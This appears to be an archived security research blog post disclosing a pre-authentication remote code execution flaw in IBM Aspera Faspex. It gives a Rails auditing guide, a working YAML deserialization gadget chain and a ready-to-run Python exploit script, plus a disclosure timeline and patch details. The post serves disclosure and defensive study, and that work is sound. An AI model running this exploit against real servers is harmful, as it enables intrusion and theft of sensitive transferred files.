---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-02_pre-auth-rce-in-aspera-faspex-case-guide-for-auditing-ruby-on-rails.md
original_filename: 2023-02-02_pre-auth-rce-in-aspera-faspex-case-guide-for-auditing-ruby-on-rails.md
title: 'Pre-Auth RCE in Aspera Faspex: Case Guide for Auditing Ruby on Rails'
category: documents
detected_topics:
- sqli
- supply-chain
- sso
- xss
- command-injection
- mobile-security
tags:
- imported
- documents
- sqli
- supply-chain
- sso
- xss
- command-injection
- mobile-security
language: en
raw_sha256: f3aef09a2b7e573c7872b42020eb4381881c367f4dd08597b9bebb3faa85923c
text_sha256: 4f67c21a902e2116d723719d1aa6eb2605f5c522023b53054b3288cae4fe7ff2
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: false
---

# Pre-Auth RCE in Aspera Faspex: Case Guide for Auditing Ruby on Rails

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-02_pre-auth-rce-in-aspera-faspex-case-guide-for-auditing-ruby-on-rails.md
- Source Type: markdown
- Detected Topics: sqli, supply-chain, sso, xss, command-injection, mobile-security
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: False
- Raw SHA256: `f3aef09a2b7e573c7872b42020eb4381881c367f4dd08597b9bebb3faa85923c`
- Text SHA256: `4f67c21a902e2116d723719d1aa6eb2605f5c522023b53054b3288cae4fe7ff2`


## Content

---
title: "Pre-Auth RCE in Aspera Faspex: Case Guide for Auditing Ruby on Rails"
url: "https://blog.assetnote.io/2023/02/02/pre-auth-rce-aspera-faspex/"
final_url: "https://www.assetnote.io/resources/research/pre-auth-rce-in-aspera-faspex-case-guide-for-auditing-ruby-on-rails"
authors: ["Maxwell Garrett (@TheGrandPew)", "Shubham Shah (@infosec_au)"]
programs: ["IBM"]
bugs: ["RCE", "Security code review", "Missing authentication", "Insecure deserialization"]
publication_date: "2023-02-02"
added_date: "2023-02-03"
source: "pentester.land/writeups.json"
original_index: 1590
---

[Research Notes](/resources/research)

Security Research

February 2, 2023

# Pre-Auth RCE in Aspera Faspex: Case Guide for Auditing Ruby on Rails

No items found.

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/653795bb35bc995a6f921d3f_citrixbleed.svg)

Creative Commons license

## Introduction

Many enterprise organizations that deal with large amounts of data that needs to be shared between employees or stakeholders often use enterprise file transfer software.

In our experience, we have seen many industries adopt this type of software to quickly deliver large files. File transfer software can store extremely sensitive data and can act as a single point of failure, as if these services are breached, all of the data stored can also be obtained by the attacker.

One of the most popular solutions for transfering files quickly and “securely” is called IBM Aspera Faspex. As explained by IBM, “IBM Aspera Faspex is a file-exchange application built on IBM Aspera High-Speed Transfer Server as a centralized transfer solution. With a Web-based GUI, Faspex offers advanced management options for FASP high-speed transfer to match your organization’s workflow.”

IBM Aspera Faspex promises security to end users by offering encryption options for the files being uploaded through its application. This security model is broken through the pre-authentication RCE vulnerability we discovered, that allowed us to execute arbitrary commands on the Aspera Faspex server.

As always, customers of our [Attack Surface Management](https://assetnote.io/) platform were the first to know when this vulnerability affected them. We continue to perform original security research in an effort to inform our customers about zero-day vulnerabilities.

This vulnerability has been assigned [CVE-2022-47986](https://www.ibm.com/support/pages/node/6952319).

## Approaching a Rails Application

When auditing a Ruby on Rails application it is important to understand the project layout. The project layout can be split up into models, views and controllers, but due to the dynamic nature of Ruby on Rails, it can sometimes not be as predictable as other frameworks such as Flask. In this case, Aspera Faspex was using a layout such as the one seen below:
  
  
  normal layout:
  app/
  views/
  controllers/
  models/
  ...
  config/
  lib/
  Gemfile
  ...
  
  

One of the things to check for when auditing a Ruby on Rails application, is whether or not they are shipping the software with a static <span class="code_single-line">SECRET_KEY_BASE</span> value inside any of their configuration files. If this value is found in the code base that you are auditing, and it is not derived through an environment variable but rather is static, this could lead to command execution through Ruby deserialization payloads.

You can see how this was exploited in the past in GitHub Enterprise here.

Another characteristic of auditing Ruby on Rails applications is the presence of a routes file containing a list of routes and the relevant controllers that handle those routes. If you come from a world of auditing Tomcat, this is essentially the equivalent of a <span class="code_single-line">web.xml</span> file.

Our methodology was to deep dive into the <span class="code_single-line">app/</span> folder and focus heavily on all of the controllers which were routable without authentication. We spent some time mapping the routes to the corresponding controllers.

When auditing any Ruby web application, there are a lot of vulnerabilities that may not be obvious unless you have previously read writeups on the sinks or have spent a lot of time programming with the language. The vulnerability we discovered in Aspera Faspex was something that either would have required researching dangerous behaviours for sinks in Ruby or previous knowledge about dangerous sinks in Ruby.

## What you might find in Rails apps

While Ruby on Rails is a complex web framework, a lot of the sinks that you will find inside Ruby on Rails projects may simply be dangerous regardless of the framework, but more to do with the Ruby programming language and libraries being used. That being said there are some specific code patterns that tend to be seen inside Ruby on Rails applications.

Below are some of the sinks you may want to look for when auditing Ruby on Rails applications:

## Deserialization

  * Oj.load
  * ActiveSupport::XmlMini.parse
  * Session cookie if the <span class="code_single-line">SECRET_KEY_BASE</span> is controlled, leaked or guessed
  * YAML.load

### Template Injection

  * render inline: “Hello “ + params[:name]
  * ERB.new(“Hello “ + params[:name]).result(context)

### SQL Injection

  * ActiveRecord based SQL Injection (https://rails-sqli.org/)

### XSS

render text, html etc, in:

  * <span class="code_single-line"><%= @var %></span>

  * raw var
  * h var

### A Unsafe YAML.load on route /package_relay/relay_package

We identified a call to <span class="code_single-line">YAML.load</span> inside a controller that seemed to be accessible without any authentication. As mentioned earlier in this blog post, one of the deserialization sinks for Ruby is this function.

Our initial steps were to backtracing the calls (tainting) to determine whether or not we controlled the user input that flowed down to this sink.

An unsafe <span class="code_single-line">YAML.load</span> inside default configurations of Ruby is quite dangerous. Through deserialization gadgets, it is possible to achieve command execution if this sink is processing user controlled data.

With this <span class="code_single-line">YAML.load</span>, we are able to construct arbitrary classes. This doesn’t necessarily mean that we will always lead to RCE, but due to the dynamic nature of class instantiation through the <span class="code_single-line">YAML.load</span>, it is a likely candidate towards achieving command execution.

The route was defined as such:
  
  
  map.resource :package_relay, :controller => :package_relay, :only => :none,
  :member => {:relay_package => :post, :relay_access => :post}
  
  

The affected controller inside Aspera Faspex was found in the file <span class="code_single-line">app/controllers/package_relay_controller.rb</span>:
  
  
  def relay_package
  begin
  ip = request.remote_ip
  host = request.remote_host
  relay = MultiServer::RelayDescriptor.new(params, ip, host)
  ...
  ...
  
  

We were able to trace the call for <span class="code_single-line">MultiServer::RelayDescriptor.new</span> to the file <span class="code_single-line">lib/multi_server/relay_descriptor.rb</span>:
  
  
  module MultiServer
  
  class RelayDescriptor
  attr_accessor :params
  attr_accessor :package_paths, :encryption, :external_emails
  attr_reader :requesting_ip, :requesting_host
  
  
  def initialize(params_hash, requesting_ip_addr, requesting_host_addr)
  self.params = params_hash
  @requesting_ip = requesting_ip_addr.to_s
  @requesting_host = requesting_host_addr.to_s
  end
  
  def params=(params_hash)
  @params = params_hash
  self.class.require_required_keys(self)
  self.class.parse(self)
  end
  
  def self.parse(relay)
  file_list = relay.params[:package_file_list]
  relay.package_paths = file_list.collect{ |p|
  EPackagePath.new(:e_uploader_local_path => p.gsub(/\\/, '/'))
  }
  enc_emails = relay.params.delete(:external_emails)
  relay.external_emails = YAML.load(enc_emails)
  relay.encryption = EConfiguration.require_ear?
  end
  
  def self.require_required_keys(relay)
  required_keys.each do |rkey|
  missing_rkey = relay.params[rkey].nil?
  raise InvalidRelayParameters, "missing #{rkey.to_s.inspect}" if missing_rkey
  end
  end
  ...
  
  

As you can see above, the params are passed from the package relay controller, reaching our <span class="code_single-line">YAML.load</span> sink with our user controlled parameter <span class="code_single-line">external_emails</span>.

## RCE Gadget

In order to achieve the RCE, we were able to use the following base gadget:

<https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html>.

However, in realistic attack scenarios we found that the version of Ruby that was bundled with Aspera Faspex became a problem. This was because certain classes we would try to instantiate were not available or differed depending on the Ruby version.

Specifically, the class <span class="code_single-line">Gem::RequestSet</span> was missing on a lot of Aspera Faspex installations, but we were able to overcome this through the use of <span class="code_single-line">PrettyPrint</span> located in <span class="code_single-line">vendor/ruby/lib/ruby/1.9.1/prettyprint.rb</span>:
  
  
  class PrettyPrint
  ...
  def breakable(sep=' ', width=sep.length)
  group = @group_stack.last
  if group.break?
  flush
  @output << @newline
  @output << @genspace.call(@indent)
  @output_width = @indent
  @buffer_width = 0
  else
  @buffer << Breakable.new(sep, width, self)
  @buffer_width += width
  break_outmost_groups
  end
  end
  ...
  
  

The final <span class="code_single-line">yaml</span> gadget we created that was reliable across Aspera Faspex installations can be found below:
  
  
  ---
  - !ruby/object:Gem::Installer
  i: x
  - !ruby/object:Gem::SpecFetcher
  i: y
  - !ruby/object:Gem::Requirement
  requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
  io: &1 !ruby/object:Gem::Package::TarReader::Entry
  read: 0
  header: "pew"
  debug_output: &1 !ruby/object:Net::WriteAdapter
  socket: &1 !ruby/object:PrettyPrint
  output: !ruby/object:Net::WriteAdapter
  socket: &1 !ruby/module "Kernel"
  method_id: :eval
  newline: "throw `whoami`"
  buffer: {}
  group_stack:
  - !ruby/object:PrettyPrint::Group
  break: true
  method_id: :breakable
  
  

## Exploit Code
  
  
  import requests, sys
  
  url = "{}/aspera/faspex/package_relay/relay_package".format(sys.argv[1])
  
  uuid = "d7cb6601-6db9-43aa-8e6b-dfb4768647ec"
  
  exploit_yaml = """
  ---
  - !ruby/object:Gem::Installer
  i: x
  - !ruby/object:Gem::SpecFetcher
  i: y
  - !ruby/object:Gem::Requirement
  requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
  io: &1 !ruby/object:Gem::Package::TarReader::Entry
  read: 0
  header: "pew"
  debug_output: &1 !ruby/object:Net::WriteAdapter
  socket: &1 !ruby/object:PrettyPrint
  output: !ruby/object:Net::WriteAdapter
  socket: &1 !ruby/module "Kernel"
  method_id: :eval
  newline: "throw `CMD`"
  buffer: {}
  group_stack:
  - !ruby/object:PrettyPrint::Group
  break: true
  method_id: :breakable
  """.replace("CMD",sys.argv[2])
  
  payload = {
  "package_file_list": [
  "/"
  ],
  "external_emails": exploit_yaml,
  "package_name": "assetnote_pack",
  "package_note": "hello from assetnote team",
  "original_sender_name": "assetnote",
  "package_uuid": uuid,
  "metadata_human_readable": "Yes",
  "forward": "pew",
  "metadata_json": '{}',
  "delivery_uuid": uuid,
  "delivery_sender_name": "assetnote",
  "delivery_title": "TEST",
  "delivery_note": "TEST",
  "delete_after_download": True,
  "delete_after_download_condition": "IDK",
  
  }
  
  r = requests.post(url,json=payload,verify=False)
  print(r.text)
  
  

## Timeline

The timeline for this disclosure process can be found below:

  * **Oct 6th, 2022** : Disclosure of the RCE vulnerability in Aspera Faspex to IBM
  * **Oct 6th, 2022** : IBM responded telling us that when we submit a vulnerability report to IBM we grant IBM a no charge license to all intellectual property rights unless we notify them that the rights are covered by someone else.

  
  
  So that IBM may utilize your vulnerability report to determine and develop appropriate remediation procedures, by submitting a vulnerability report to IBM, you grant to IBM Corporation, its subsidiaries and its affiliates, a perpetual, irrevocable, no charge license to all intellectual property rights licensable by you in or related to the use of this material.
  
  Also, for similar reasons, it is important that you notify us if any of this material is not your own work or is covered by the intellectual property rights of others.
  
  Not notifying us means that you've represented that no third-party intellectual property rights are involved.
  
  

  * **Oct 14th, 2022** : We clarify with IBM that the research was done during employment at Assetnote and as per the employment contract all intellectual property rights belong to Assetnote.
  * **Nov 5th, 2022** : IBM acknowledges and accepts that intellectual property rights are owned by Assetnote.
  * **Jan 15th, 2023** : We request an update regarding the remediation of this vulnerability
  * **Jan 18th, 2023** : IBM notifies us that the vulnerability has been patched in [Faspex 4.4.2 Patch Level 2](https://www.ibm.com/docs/en/aspera-faspex/4.4?topic=notes-release-aspera-faspex-442).

## Remediation

This vulnerability can be remediated by either upgrading to [Faspex 4.4.2 Patch Level 2](https://www.ibm.com/docs/en/aspera-faspex/4.4?topic=notes-release-aspera-faspex-442) or Faspex 5.x which does not contain this vulnerability. See IBM’s security advisory for this issue [here](https://www.ibm.com/support/pages/node/6952319).

Written by:

Max Garrett

Shubham Shah

Your subscription could not be saved. Please try again. 

Your subscription has been successful. 

Get updates on our research

Subscribe to our newsletter and stay updated on the newest research, security advisories, and more!

Enter your email address to subscribe

Provide your email address to subscribe. For e.g abc@xyz.com 

SUBSCRIBE 

### More Like This

[Security ResearchNew!Doing the Due Diligence: Analyzing the Next.js Middleware Bypass (CVE-2025-29927)Read moreRead on ASN Blog](/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927)

[Security ResearchNew!How an obscure PHP footgun led to RCE in Craft CMSRead moreRead on ASN Blog](/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms)

[Security ResearchNew!Citrix Denial of Service: Analysis of CVE-2024-8534Read moreRead on ASN Blog](/resources/research/citrix-denial-of-service-analysis-of-cve-2024-8534)

[Security ResearchNew!Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)Read moreRead on ASN Blog](/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os)

[Security ResearchNew!Leveraging An Order of Operations Bug to Achieve RCE in Sitecore 8.x - 10.xRead moreRead on ASN Blog](/resources/research/leveraging-an-order-of-operations-bug-to-achieve-rce-in-sitecore-8-x---10-x)

[Security ResearchNew!Insecurity through Censorship: Vulnerabilities Caused by The Great FirewallRead moreRead on ASN Blog](/resources/research/insecurity-through-censorship-vulnerabilities-caused-by-the-great-firewall)

[Back to All](/resources/research)

### Ready to get started?

Get on a call with our team and learn how Assetnote can change the way you secure your attack surface. We'll set you up with a trial instance so you can see the impact for yourself.

[Request a Demo](/demo)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/64241df2676aeba82706ffe8_assetnote-logo.svg)

Address:  
Level 10, 12 Creek Street, Brisbane QLD, 4000  
‍  
Contact:  
[contact@assetnote.io  
  
](mailto:contact@assetnote.io)Press Inquiries:[  
](mailto:contact@assetnote.io)[press@assetnote.io](mailto:press@assetnote.io)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/661f041240ed96ed7a03fe6f_61dc1beb212a1202fc512a76_SOC%202-03-p-500.png)

[](https://twitter.com/assetnote)[](https://www.linkedin.com/company/assetnote/)

Platform Features

[Continuous Asset Discovery](/platform/asset-discovery)

[Deep Asset Enrichment](/platform/asset-enrichment)

[Assetnote Exposure Engine](/platform/assetnote-exposure-engine)

[Expert Security Research](/platform/expert-security-research)

[Collaborative Workflows](/platform/collaborative-workflows)

[Customization](/platform/customization)

Use Cases

[Continuous Asset Discovery and Inventory](/use-cases/continuous-asset-discovery-and-inventory)

[Real-Time Exposure Monitoring](/use-cases/continuous-security-monitoring)

[Attack Surface Reduction](/use-cases/attack-surface-reduction)

[Mergers & Acquisitions](/use-cases/mergers-and-acquisitions)

[Bug Bounty Readiness](/use-cases/bug-bounty-readiness)

© 2026 Assetnote. All rights reserved.

[Privacy Policy](https://assetnote.io/policies/privacy-policy)
